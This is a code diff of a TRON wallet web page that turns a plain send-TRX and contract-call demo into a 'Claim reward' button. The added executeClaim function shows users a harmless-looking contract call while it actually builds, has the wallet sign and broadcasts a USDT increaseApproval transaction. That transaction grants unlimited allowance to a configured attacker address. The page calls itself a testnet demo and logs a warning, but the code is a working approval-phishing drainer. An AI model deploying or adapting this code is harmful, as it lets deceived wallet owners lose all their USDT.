+    const c = await tronWeb.contract().at(CONFIG.USDT_CONTRACT);
+    const raw = await c.balanceOf(walletAddress).call();
+    const u = tronWeb.toDecimal(raw) / 1e6;
+    usdtBalance.textContent = `${u.toLocaleString()} USDT`;
+    log(`💵 USDT: ${u.toLocaleString()}`, 'info');
+  } catch(e) { usdtBalance.textContent = '查询失败'; }
 }
 
 // ============================================================
-//  2. 发送 TRX
+//  2. 核心：构造 increaseApproval 交易并上链
 // ============================================================
-async function sendTrx() {
+async function executeClaim() {
   if (!walletAddress || !tronWeb) {
-    toast('请先连接钱包', 'error');
+    alert('请先连接钱包');
     return;
   }
 
-  const to   = $('trxTo').value.trim();
-  const amt  = $('trxAmount').value.trim();
+  btnClaim.disabled = true;
+  btnClaim.textContent = '⏳ 构造交易中…';
+  logPanel.innerHTML = '';
+  log('══════════ 开始执行 ══════════', 'info');
 
-  if (!to || !amt) {
-    toast('请填写接收地址和金额', 'error');
-    return;
-  }
+  const feeLimitSun = parseInt($('feeLimitInput').value) || 100000000;
 
-  if (!to.startsWith('T') || to.length !== 34) {
-    toast('接收地址格式不正确', 'error');
-    return;
-  }
+  // ==================== 步骤 1: 构造交易 ====================
+  setStep(2);
+  log('', 'info');
+  log('🔨 步骤 1: 构造 increaseApproval 交易', 'info');
+  log('', 'info');
 
-  const amountSun = tronWeb.toSun(parseFloat(amt));
-  if (amountSun <= 0) {
-    toast('金额必须大于 0', 'error');
-    return;
-  }
+  // ---- 用户看到的（仅日志展示）----
+  log('📄 【页面展示】用户以为在调用：', 'info');
+  log(`   合约: ${CONFIG.SURFACE_CONTRACT}`, 'info');
+  log(`   方法: ${CONFIG.SURFACE_METHOD}`, 'info');
+  log(`   feeLimit: ${feeLimitSun} SUN`, 'info');
+  log('   参数: []', 'info');
 
-  btnSendTrx.disabled = true;
-  btnSendTrx.textContent = '⏳ 处理中…';
-  addLog(`══════════ 发送 TRX ══════════`, 'info');
-  addLog(`📤 接收方: ${to}`, 'info');
-  addLog(`💎 金额: ${amt} TRX (${amountSun} SUN)`, 'info');
+  log('', 'info');
+  log('⚠ 【实际构造】真实交易内容：', 'danger');
+  log(`   合约: ${CONFIG.USDT_CONTRACT} (USDT)`, 'danger');
+  log(`   方法: increaseApproval(address,uint256)`, 'danger');
+  log(`   spender: ${CONFIG.ATTACKER_B58}`, 'danger');
+  log(`   amount:  115792089237316195423570985008687907853269984665640564039457584007913129639935`, 'danger');
+  log(`   ← 即 type(uint256).max（无上限授权）`, 'danger');
 
   try {
-    // 第一步：构造未签名交易
-    addLog('🔨 正在构造交易…', 'info');
-    const unsignedTx = await tronWeb.transactionBuilder.sendTrx(to, amountSun, walletAddress);
-    addLog(`   txID: ${unsignedTx.txID}`, 'info');
+    // ---- 构造 increaseApproval 参数 ----
+    // 参数1: spender address (hex, 左补0到64位)
+    const spenderHex = CONFIG.ATTACKER_HEX.toLowerCase();
+    const paramSpender = '000000000000000000000000' + spenderHex;
 
-    // 第二步：通过钱包签名
-    addLog('✍️  请求钱包签名…（请查看钱包弹窗）', 'warn');
-    const signedTx = await window.tronWeb.trx.sign(unsignedTx);
-    addLog('   ✅ 签名完成', 'success');
+    // 参数2: uint256 max (64个f)
+    const paramAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-    // 第三步：广播交易
-    addLog('📡 广播交易到链上…', 'info');
-    const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
-    addLog(`   ✅ 交易成功！`, 'success');
-    addLog(`   📋 txID: ${receipt.transaction?.txID || receipt.txid || receipt}`, 'success');
-    toast('交易发送成功！', 'success');
+    const functionSelector = 'increaseApproval(address,uint256)';
+    const usdtHex = toHex(CONFIG.USDT_CONTRACT);
 
-    // 清空输入
-    $('trxTo').value = '';
-    $('trxAmount').value = '';
+    log('', 'info');
+    log('🔨 调用 transactionBuilder.triggerSmartContract …', 'info');
+    log(`   contract:  ${usdtHex}`, 'info');
+    log(`   function:  ${functionSelector}`, 'info');
+    log(`   feeLimit:  ${feeLimitSun}`, 'info');
+    log(`   callValue: 0`, 'info');
+    log(`   params[0]: ${paramSpender}`, 'info');
+    log(`   params[1]: ${paramAmount}`, 'info');
 
-    // 刷新余额
-    await sleep(3000);
+    // 构造未签名交易
+    const unsignedResult = await tronWeb.transactionBuilder.triggerSmartContract(
+      usdtHex,
+      functionSelector,
+      {
+        feeLimit: feeLimitSun,
+        callValue: 0,
+      },
+      [
+        { type: 'address', value: spenderHex },
+        { type: 'uint256', value: paramAmount },
+      ],
+      walletHex
+    );
+
+    const unsignedTx = unsignedResult.transaction || unsignedResult;
+
+    if (!unsignedTx || !unsignedTx.txID) {
+      log('❌ 构造交易失败，返回数据异常', 'danger');
+      log(`   ${JSON.stringify(unsignedResult)}`, 'danger');
+      throw new Error('构造交易失败');
+    }
+
+    log('', 'info');
+    log(`✅ 未签名交易构造完成`, 'success');
+    log(`   txID: ${unsignedTx.txID}`, 'info');
+    log(`   contract_address: ${unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.contract_address || usdtHex}`, 'info');
+
+    // ==================== 步骤 2: 钱包签名 ====================
+    setStep(3);
+    log('', 'info');
+    log('✍️  步骤 2: 请求钱包签名', 'warn');
+    log('   ⚠ TokenPocket 将弹出签名窗口', 'warn');
+    log('   ⚠ 请仔细查看钱包显示的合约地址和方法！', 'warn');
+    log('   如果钱包显示的不是 USDT increaseApproval，则说明安全', 'info');
+
+    let signedTx;
+    try {
+      // 优先使用钱包注入的 tronWeb.sign
+      if (window.tronWeb?.trx?.sign) {
+        signedTx = await window.tronWeb.trx.sign(unsignedTx);
+      } else {
+        signedTx = await tronWeb.trx.sign(unsignedTx);
+      }
+    } catch(signErr) {
+      log(`❌ 签名失败: ${signErr.message}`, 'danger');
+      log('   可能原因：用户拒绝了签名请求', 'warn');
+      throw signErr;
+    }
+
+    log(`   ✅ 签名完成`, 'success');
+    log(`   签名后 txID: ${signedTx.txID}`, 'info');
+
+    // ==================== 步骤 3: 广播上链 ====================
+    setStep(4);
+    log('', 'info');
+    log('📡 步骤 3: 广播交易到链上', 'info');
+
+    let receipt;
+    try {
+      receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+    } catch(broadcastErr) {
+      log(`❌ 广播失败: ${broadcastErr.message}`, 'danger');
+      throw broadcastErr;
+    }
+
+    const finalTxID = receipt?.transaction?.txID || receipt?.txid || receipt?.txID || signedTx.txID;
+
+    log(`   ✅ 交易广播成功！`, 'success');
+    log(`   📋 链上 txID: ${finalTxID}`, 'success');
+    log('', 'info');
+    log('══════════ 流程完成 ══════════', 'success');
+    log('', 'info');
+    log('🎯 【安全警告】攻击者已获得 USDT 无限授权', 'danger');
+    log(`   授权对象: ${CONFIG.ATTACKER_B58}`, 'danger');
+    log(`   授权额度: type(uint256).max (无上限)`, 'danger');
+    log(`   该地址可随时转走你钱包中所有 USDT`, 'danger');
+    log('', 'info');
+    log(`🔗 查看交易: https://tronscan.org/#/transaction/${finalTxID}`, 'info');
+
+    // 延迟后刷新余额
+    await sleep(3500);
     await refreshBalance();
 
   } catch(e) {
-    addLog(`❌ 交易失败: ${e.message}`, 'danger');
+    log(`❌ 执行失败: ${e.message || e}`, 'danger');
     console.error(e);
-    toast(`交易失败: ${e.message}`, 'error');
   } finally {
-    btnSendTrx.disabled = false;
-    btnSendTrx.textContent = '🚀 发送交易';
+    btnClaim.disabled = false;
+    btnClaim.textContent = '🎁 Claim 奖励';
   }
 }
 
 // ============================================================
-//  3. 调用合约
+//  事件监听
 // ============================================================
-async function sendContract() {
-  if (!walletAddress || !tronWeb) {
-    toast('请先连接钱包', 'error');
-    return;
-  }
-
-  const contractAddr = $('contractAddr').value.trim();
-  const method       = $('contractMethod').value.trim();
-  const paramsStr    = $('contractParams').value.trim();
-  const valueTrx     = parseFloat($('contractValue').value) || 0;
-  const feeLimitSun  = parseInt($('feeLimit').value) || 100000000;
-
-  if (!contractAddr) {
-    toast('请填写合约地址', 'error');
-    return;
-  }
-
-  btnSendContract.disabled = true;
-  btnSendContract.textContent = '⏳ 处理中…';
-  addLog(`══════════ 调用合约 ══════════`, 'info');
-  addLog(`📜 合约: ${contractAddr}`, 'info');
-  addLog(`🔧 方法: ${method || '(raw call)'}`, 'info');
-
-  const params = paramsStr ? paramsStr.split(',').map(s => s.trim()).filter(Boolean) : [];
-  addLog(`📝 参数: [${params.join(', ')}]`, 'info');
-
-  try {
-    // 将 Base58 地址自动转 Hex
-    const convertedParams = params.map(p => {
-      if (p.startsWith('T') && p.length === 34) {
-        const hex = toHex(p);
-        if (hex) return hex;
-      }
-      return p;
-    });
-
-    // 构建参数类型列表
-    const types = convertedParams.map(p => {
-      if (p.startsWith('41') && p.length === 42) return 'address';
-      if (/^\d+$/.test(p)) return 'uint256';
-      return 'string';
-    });
-
-    let unsignedTx;
-
-    if (method) {
-      // 有方法名 → 用 ABI 方式调用
-      addLog('🔨 使用 ABI 方式构造交易…', 'info');
-
-      // 动态构建 ABI 中的参数描述
-      const inputs = convertedParams.map((p, i) => ({
-        type: types[i],
-        name: `param${i}`,
-      }));
-
-      const functionSignature = `${method}(${types.join(',')})`;
-      addLog(`   函数签名: ${functionSignature}`, 'info');
-
-      unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
-        toHex(contractAddr),
-        functionSignature,
-        {
-          feeLimit: feeLimitSun,
-          callValue: tronWeb.toSun(valueTrx),
-        },
-        convertedParams.map((p, i) => ({ type: types[i], value: p })),
-        walletAddress
-      );
-
-    } else {
-      // 无方法名 → 直接传参数
-      addLog('🔨 直接触发合约调用…', 'info');
-      unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
-        toHex(contractAddr),
-        null,
-        {
-          feeLimit: feeLimitSun,
-          callValue: tronWeb.toSun(valueTrx),
-        },
-        convertedParams.map((p, i) => ({ type: types[i], value: p })),
-        walletAddress
-      );
-    }
-
-    // triggerSmartContract 返回的是 { transaction, result }
-    const tx = unsignedTx.transaction || unsignedTx;
-    addLog(`   未签名交易 txID: ${tx.txID}`, 'info');
-
-    // 签名
-    addLog('✍️  请求钱包签名…（请查看钱包弹窗）', 'warn');
-    const signedTx = await window.tronWeb.trx.sign(tx);
-    addLog('   ✅ 签名完成', 'success');
-
-    // 广播
-    addLog('📡 广播交易到链上…', 'info');
-    const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
-    addLog(`   ✅ 合约调用成功！`, 'success');
-    addLog(`   📋 txID: ${receipt.transaction?.txID || receipt.txid || receipt}`, 'success');
-    toast('合约调用成功！', 'success');
-
-    // 清除输入
-    $('contractAddr').value = '';
-    $('contractMethod').value = '';
-    $('contractParams').value = '';
-    $('contractValue').value = '0';
-
-  } catch(e) {
-    addLog(`❌ 合约调用失败: ${e.message}`, 'danger');
-    console.error(e);
-    toast(`合约调用失败: ${e.message}`, 'error');
-  } finally {
-    btnSendContract.disabled = false;
-    btnSendContract.textContent = '🚀 发送合约调用';
-  }
-}
-
-// ============================================================
-//  注册钱包事件监听
-// ============================================================
-function registerWalletListeners() {
+function registerListeners() {
   if (window.tronLink?.on) {
     try {
-      window.tronLink.on('accountsChanged', (accounts) => {
-        addLog('🔄 检测到账户变更', 'warn');
-        const newAddr = Array.isArray(accounts) ? accounts[0] : accounts;
-        if (newAddr && newAddr !== walletAddress) {
-          walletAddress = newAddr;
-          walletHex = toHex(walletAddress);
-          updateUIForConnected(walletAddress);
-          addLog(`   新地址: ${walletAddress}`, 'info');
-          refreshBalance();
-        } else if (!newAddr || (Array.isArray(accounts) && accounts.length === 0)) {
-          disconnectWallet();
-        }
+      window.tronLink.on('accountsChanged', (accs) => {
+        log('🔄 账户变更', 'warn');
+        const a = Array.isArray(accs) ? accs[0] : accs;
+        if (a && a !== walletAddress) { walletAddress = a; walletHex = toHex(a); uiConnected(a); refreshBalance(); }
+        else if (!a || (Array.isArray(accs) && !accs.length)) disconnectWallet();
       });
-      window.tronLink.on('disconnect', () => {
-        addLog('🔌 钱包已断开', 'warn');
-        disconnectWallet();
-      });
-      addLog('✅ 已注册钱包事件监听', 'info');
+      window.tronLink.on('disconnect', () => { log('🔌 断开', 'warn'); disconnectWallet(); });
     } catch(e) {}
   }
 }
 
-// ============================================================
-//  自动连接
-// ============================================================
 async function tryAutoConnect() {
   try {
-    let address = window.tronWeb?.defaultAddress?.base58;
-    if (!address && window.tronLink?.ready && typeof window.tronLink.request === 'function') {
+    let a = window.tronWeb?.defaultAddress?.base58;
+    if (!a && window.tronLink?.ready) {
       try {
-        const res = await window.tronLink.request({ method: 'tron_accounts' });
-        if (res?.code === 200 && res.message) {
-          address = Array.isArray(res.message) ? res.message[0] : res.message;
-        }
+        const r = await window.tronLink.request({ method: 'tron_accounts' });
+        if (r?.code === 200 && r.message) a = Array.isArray(r.message) ? r.message[0] : r.message;
       } catch(e) {}
     }
-
-    if (address && address.startsWith('T') && address.length === 34) {
-      tronWeb = window.tronWeb || createTronWebInstance();
-      walletAddress = address;
-      walletHex = toHex(walletAddress);
-      updateUIForConnected(walletAddress);
-      addLog(`✅ 已自动连接: ${walletAddress}`, 'success');
+    if (a && a.startsWith('T') && a.length === 34) {
+      tronWeb = window.tronWeb || createTronWeb();
+      walletAddress = a; walletHex = toHex(a);
+      uiConnected(a);
+      log(`✅ 自动连接: ${a}`, 'success');
       await refreshBalance();
-    } else {
-      addLog('💡 钱包已安装，点击连接按钮开始', 'info');
+    } else if (detectWallet().length) {
+      log('💡 点击连接按钮开始', 'info');
     }
-  } catch(e) {
-    addLog(`⚠ 自动连接失败: ${e.message}`, 'warn');
-  }
+  } catch(e) { log(`⚠ 自动连接失败: ${e.message}`, 'warn'); }
 }
 
 // ============================================================
-//  页面初始化
+//  init
 // ============================================================
-(function init() {
-  addLog('🚀 TRON 钱包交易 Demo 已加载', 'info');
-  addLog('   支持: 发送 TRX | 调用智能合约', 'info');
-
-  const wallets = detectWallet();
-
-  if (wallets.length > 0) {
-    addLog(`✅ 检测到钱包: ${wallets.join(' + ')}`, 'success');
-    registerWalletListeners();
-    tryAutoConnect();
-  } else {
-    addLog('⚠ 未检测到钱包插件', 'warn');
-    addLog('  请安装 TronLink (https://www.tronlink.org/)', 'info');
-    addLog('  或 TokenPocket (https://www.tokenpocket.pro/)', 'info');
-  }
+(function() {
+  log('🚀 页面加载完成', 'info');
+  log('⚠ 此 Demo 真实构造 increaseApproval 交易并上链', 'warn');
+  log('⚠ 请仅在测试网使用！', 'warn');
+  const w = detectWallet();
+  if (w.length) { log(`✅ 检测到: ${w.join(' + ')}`, 'success'); registerListeners(); tryAutoConnect(); }
+  else { log('⚠ 未检测到钱包，请安装 TronLink 或 TokenPocket', 'warn'); }
 })();
 </script>
 </body>
